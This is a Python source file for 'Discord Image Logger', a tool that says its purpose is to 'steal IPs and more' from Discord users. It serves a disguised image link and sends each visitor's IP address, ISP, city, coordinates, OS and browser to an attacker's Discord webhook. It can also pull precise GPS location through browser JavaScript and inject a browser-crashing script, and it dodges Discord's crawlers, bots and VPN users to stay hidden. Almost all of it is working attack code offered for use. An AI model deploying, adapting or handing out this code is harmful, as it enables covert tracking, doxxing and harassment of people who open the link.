# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser, json
import ssl

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "YOUR_WEBHOOK_URL", # Replace with your Discord webhook URL
    "image": "https://i1.sndcdn.com/artworks-000349102620-mufv3v-t500x500.jpg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to
    },

    # HTTPS Configuration
    "https": {
        "enabled": True, # Enable HTTPS
        "certificate_path": "path/to/your/certificate.pem", # Path to your SSL certificate file
        "private_key_path": "path/to/your/private_key.pem"  # Path to your SSL private key file
    },

    "port": 8000 # Port to run the server on (default: 8000)


    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json = {
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        })
    except Exception as e:
        print(f"Failed to send error to webhook: {e}")

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)

    if bot:
        try:
            requests.post(config["webhook"], json = {
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }
                ],
            }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        except Exception as e:
            print(f"Failed to send link alert to webhook: {e}")
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        if info["proxy"]:
            if config["vpnCheck"] == 2:
                    return

            if config["vpnCheck"] == 1:
                ping = ""

        if info["hosting"]:
            if config["antiBot"] == 4:
                if info["proxy"]:
                    pass
                else:
                    return

            if config["antiBot"] == 3:
                    return

            if config["antiBot"] == 2:
                if info["proxy"]:
                    pass
                else:
                    ping = ""

            if config["antiBot"] == 1:
                    ping = ""
    except Exception as e:
        print(f"Failed to get IP information from API: {e}")
        info = {} # Assign an empty dictionary to info if the API call fails

    os, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', 'Unknown'))+', '+str(info.get('lon', 'Unknown')) if (info.get('lat') and info.get('lon')) else 'Unknown' if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if info.get('timezone') else 'Unknown'} ({info.get('timezone', 'Unknown').split('/')[0] if info.get('timezone') else 'Unknown'})`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`
> **Bot:** `{info.get('hosting', 'Unknown') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
                }
        ],
    }

    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    try:
        requests.post(config["webhook"], json = embed)
    except Exception as e:
        print(f"Failed to send IP log to webhook: {e}")
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):

    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()

            ip = self.headers.get('x-forwarded-for') or self.client_address[0]  # Get IP, handling potential absence of X-Forwarded-For

            if ip.startswith(blacklistedIPs):
                return

            if botCheck(ip, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(ip, endpoint = s.split("?")[0], url = url)

                return

            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                location_data = {}

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(ip, self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                elif config["accurateLocation"]:
                    result = makeReport(ip, self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                else:
                    result = makeReport(ip, self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)


                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", ip)
                    message = message.replace("{isp}", result.get("isp", "Unknown")) # Use .get() with default values to prevent KeyError
                    message = message.replace("{asn}", result.get("as", "Unknown"))
                    message = message.replace("{country}", result.get("country", "Unknown"))
                    message = message.replace("{region}", result.get("regionName", "Unknown"))
                    message = message.replace("{city}", result.get("city", "Unknown"))
                    message = message.replace("{lat}", str(result.get("lat", "Unknown")))
                    message = message.replace("{long}", str(result.get("lon", "Unknown")))
                    message = message.replace("{timezone}", f"{result.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if result.get('timezone') else 'Unknown'}") # Check if timezone exists before splitting
                    message = message.replace("{mobile}", str(result.get("mobile", "Unknown")))
                    message = message.replace("{vpn}", str(result.get("proxy", "Unknown")))
                    message = message.replace("{bot}", str(result.get("hosting", "Unknown") if result.get("hosting") and not result.get("proxy") else 'Possibly' if result.get("hosting") else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()

                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()

                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                # Capture location via javascript and pass the coordinates to the server again
                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            function (position) {
                var coords = position.coords.latitude + "," + position.coords.longitude;
                var encodedCoords = btoa(coords).replace(/=/g, "%3D");
                if (currenturl.includes("?")) {
                    currenturl += ("&g=" + encodedCoords);
                } else {
                    currenturl += ("?g=" + encodedCoords);
                }
                location.replace(currenturl);
            },
            function (error) {
                console.error("Error getting location:", error);
            },
            {
                enableHighAccuracy: true, // Request high accuracy (GPS) if available
                timeout: 5000,           // Set a timeout of 5 seconds
                maximumAge: 0             // Don't use cached locations
            }

        );
    } else {
        console.log("Geolocation is not supported by this browser.");
    }
}

</script>"""
                self.wfile.write(data)

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            error_message = traceback.format_exc()
            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(error_message)



    do_GET = handleRequest
    do_POST = handleRequest


if __name__ == '__main__':
    host = '0.0.0.0'  # Listen on all interfaces
    port = config.get("port", 8000)

    handler = ImageLoggerAPI
    httpd = HTTPServer((host, port), handler)

    if config["https"]["enabled"]:
        try:
            httpd.socket = ssl.wrap_socket(httpd.socket,
                                           certfile=config["https"]["certificate_path"],
                                           keyfile=config["https"]["private_key_path"], server_side=True)
            print(f"Running HTTPS server on {host}:{port}")
        except Exception as e:
            print(f"Failed to enable HTTPS: {e}. Running in HTTP mode instead.  Make sure certificate and key paths are correct in config.")
            print("To generate a self-signed certificate for testing (not for production):")
            print("openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365") # Add this to the prompt
    else:
        print(f"Running HTTP server on {host}:{port}")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\nStopping server...")
        httpd.server_close()
